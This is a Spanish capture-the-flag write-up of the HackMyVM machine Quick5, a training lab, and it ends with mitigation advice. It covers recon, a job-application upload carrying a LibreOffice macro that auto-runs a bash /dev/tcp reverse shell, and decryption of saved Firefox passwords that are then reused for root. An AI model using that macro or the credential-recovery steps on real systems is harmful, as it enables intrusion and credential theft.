# Writeup: Máquina Quick5 (HackMyVM)

En este writeup detallo el proceso de explotación y escalada de privilegios de la máquina **Quick5** de la plataforma HackMyVM. A diferencia de una explotación típica de servicios, el acceso inicial se consigue mediante un ataque del lado cliente sobre un proceso de selección de personal, y la escalada de privilegios pasa por la recuperación de credenciales cifradas almacenadas por el navegador Firefox.

---

## Resumen

Quick5 simula el sitio web de una empresa de automoción con varios subdominios internos. El vector de entrada no explota ninguna vulnerabilidad de servicio, sino el propio proceso humano de selección de personal: un formulario de solicitud de empleo acepta documentos ofimáticos, lo que permite subir un `.odt` con una macro maliciosa que se ejecuta al ser revisado internamente. La escalada de privilegios posterior tampoco depende de un binario mal configurado, sino de credenciales guardadas en el gestor de contraseñas de Firefox, recuperables porque el perfil no está protegido con contraseña maestra — y directamente reutilizables como root.

---

## 1. Reconocimiento Inicial

Ejecutamos un escaneo de puertos completo con `nmap` para descubrir los servicios expuestos:

```bash
nmap -p- --open -sSCV -n -Pn 192.168.0.27 -oN tcpScan
```

* **Puerto 22/tcp:** `OpenSSH 8.9p1 Ubuntu 3ubuntu0.6`. Al tratarse de una versión superior a la 7.7, el propio demonio ya no distingue entre "usuario inválido" y "usuario válido con contraseña incorrecta" en su tiempo de respuesta — la enumeración de usuarios por temporización queda descartada, y con ella cualquier vía de ataque directa contra SSH en esta fase.
* **Puerto 80/tcp:** `Apache httpd 2.4.52`, alojando el sitio *Quick Automative - Home*.

Con SSH descartado como vector inmediato, centramos el resto de la enumeración en el servicio web.

---

## 2. Enumeración Web

Ejecutamos `whatweb` sobre el servicio HTTP para extraer tecnologías e información de cabecera:

```bash
whatweb http://192.168.0.27
```

* **Tecnologías detectadas:** Apache 2.4.52, Bootstrap 4, jQuery 3.4.1 y HTML5.
* **Correos identificados:** `book@quick.hmv`, `info@quick.hmv` y `tech@quick.hmv`.
* **Dominio objetivo:** `quick.hmv`.

Al examinar manualmente la aplicación web destacan tres hallazgos, cada uno con una lectura distinta de cara al ataque:
* Se muestran los nombres de 8 empleados — material directo para construir un diccionario de usuarios potenciales, útil si más adelante aparece algún servicio de autenticación.
* Existen dos formularios de contacto con campos de texto libre — candidatos naturales para probar inyecciones, aunque de momento quedan anotados como pendientes de revisar.
* Al inspeccionar los enlaces con el cursor, se revelan los subdominios `careers.quick.hmv` y `customer.quick.hmv` — la propia existencia de subdominios no listados en la navegación principal es indicio de **virtual hosting**, lo que abre la puerta a que existan más vhosts sin enlazar públicamente.

Añadimos los dominios descubiertos a `/etc/hosts` para poder resolverlos:

```text
192.168.0.27 quick.hmv careers.quick.hmv customer.quick.hmv
```

Al visitar `customer.quick.hmv` nos encontramos con el siguiente aviso:

> "This page is under maintenance due to a security incident."

Un mensaje así, expuesto públicamente, es en sí mismo una fuga de información: confirma que el sistema tiene un historial de compromiso y sugiere la posible existencia de un *backdoor* o de algún resto no remediado del incidente original.

### Fuzzing de Virtual Hosts (VHosts)

Dado que ya confirmamos el uso de virtual hosting, tiene sentido fuzzear en busca de más subdominios no enlazados:

```bash
gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://quick.hmv -r --append-domain
```

* **Subdominio descubierto:** `employee.quick.hmv` (Status 200).

Tras añadirlo a `/etc/hosts`, comprobamos que despliega el mismo mensaje de mantenimiento que `customer.quick.hmv` — probablemente ambos comparten backend o plantilla, sin contenido explotable adicional por esta vía.

---

## 3. Explotación (Acceso Inicial)

En `careers.quick.hmv`, los candidatos pueden adjuntar archivos en formato `.odt` o `.pdf` para aplicar a vacantes. El dato clave aquí no es la subida en sí, sino que **estos documentos van a ser abiertos por una persona real dentro de la organización** — eso convierte un simple formulario de subida de ficheros en una vía de ejecución de código del lado cliente, vía macros de documento.

### Creación del Documento Malicioso

1. Abrimos LibreOffice Writer, añadimos texto cualquiera y creamos una nueva macro.
2. Añadimos el payload para obtener una shell inversa:

```basic
Sub Main
    shell("bash -c 'bash -i >& /dev/tcp/192.168.0.43/443 2>&1'")
End Sub
```

3. Configuramos el evento para que la macro se ejecute automáticamente al abrir el archivo, y guardamos el documento en formato `.odt` — precisamente el formato aceptado por el propio formulario, para no llamar la atención de ningún filtro de tipo de fichero.

### Explotación

Levantamos un listener en nuestra máquina atacante y subimos el archivo a través del formulario de `careers.quick.hmv`:

```bash
nc -lvnp 443
```

Tras unos momentos, el documento es abierto en el sistema objetivo — lo que confirma que existe un proceso de revisión activo — y recibimos una conexión reversa como el usuario **andrew**, obteniendo la primera flag.

---

## 4. Escalada de Privilegios

### 4.1. Localización de credenciales almacenadas

Iniciamos la enumeración local buscando referencias a credenciales en el sistema:

```bash
grep -r "pass" / 2>/dev/null
```

El volumen de resultados es tan alto que cancelamos el comando, pero al inicio de la salida destaca un archivo de perfil de Firefox:

```
/home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/logins.json
```

![Captura de logins.json](images/quick-2.jpg)

Este archivo contiene los campos `encryptedUsername` y `encryptedPassword`. Probamos `hashid` y `hashcat` sobre estos valores sin ningún resultado — y no es casualidad: Firefox no almacena estas credenciales como un hash tradicional, sino cifradas mediante **NSS** (Network Security Services), un mecanismo de cifrado reversible pensado para que el propio navegador pueda recuperar la contraseña en texto plano al rellenar un formulario. Contra eso, ni `hashid` ni `hashcat` tienen nada que hacer — lo que hace falta no es crackear, sino **descifrar**.

### 4.2. Descifrado y reutilización de credenciales

Para descifrar los datos de Firefox empleamos la herramienta [firefox_decrypt](https://github.com/unode/firefox_decrypt), diseñada específicamente para este mecanismo NSS.

Al ejecutarla directamente, falla: no encuentra `profiles.ini` en la ruta habitual (`~/.mozilla/firefox`). La razón es que Firefox está instalado vía **Snap**, cuyo sandboxing de aplicaciones redirige el almacenamiento de datos de usuario a una ruta distinta dentro de `~/snap/`. Localizamos la ruta real:

```bash
find / -iname "profiles.ini" 2>/dev/null
# /home/andrew/snap/firefox/common/.mozilla/firefox/profiles.ini
```

Ejecutamos el script apuntando al directorio base correcto:

```bash
./firefox_decrypt.py /home/andrew/snap/firefox/common/.mozilla/firefox
```

**Credenciales recuperadas:**
* **Sitio Web:** `http://employee.quick.hmv`
* **Usuario:** `andrew.speed@quick.hmv`
* **Contraseña:** `SuperSecretPassword`

Estas credenciales estaban pensadas para un portal interno de bajo privilegio — pero probamos su reutilización directamente contra el usuario **root**, y la autenticación resulta exitosa. Obtenemos acceso total con privilegios elevados junto a la flag final.

---

## 5. Detección y Mitigación

- **Mensajes de mantenimiento que revelan información sensible**: anunciar públicamente que un subdominio está caído "por un incidente de seguridad" informa a cualquier atacante de que el sistema tiene un historial de compromiso. Este tipo de mensajes no debería exponer contexto de seguridad, ni siquiera de forma indirecta.
- **Formularios de subida de documentos sin sandboxing**: un proceso de selección que abre documentos de candidatos externos debería hacerlo en un entorno aislado (máquina virtual desechable o sandbox de documentos), nunca directamente en un sistema con acceso a datos internos.
- **Macros habilitadas por defecto en documentos externos**: cualquier documento ofimático recibido de una fuente externa debería abrirse con las macros deshabilitadas por política, o convertirse a un formato sin capacidad de ejecución antes de su revisión.
- **Credenciales de servicios internos guardadas en el gestor de contraseñas del navegador sin contraseña maestra**: Firefox permite cifrar `logins.json` con una master password adicional; en este caso no estaba activa, ya que el descifrado funcionó sin necesidad de ella. Sin esa capa adicional, cualquier acceso al perfil del usuario equivale a tener las contraseñas en texto plano.
- **Reutilización de contraseñas entre una cuenta de aplicación de bajo privilegio y la cuenta root**: ninguna credencial de un portal interno debería coincidir con la de una cuenta administrativa del sistema operativo — son superficies de riesgo completamente distintas y deberían gestionarse por separado.
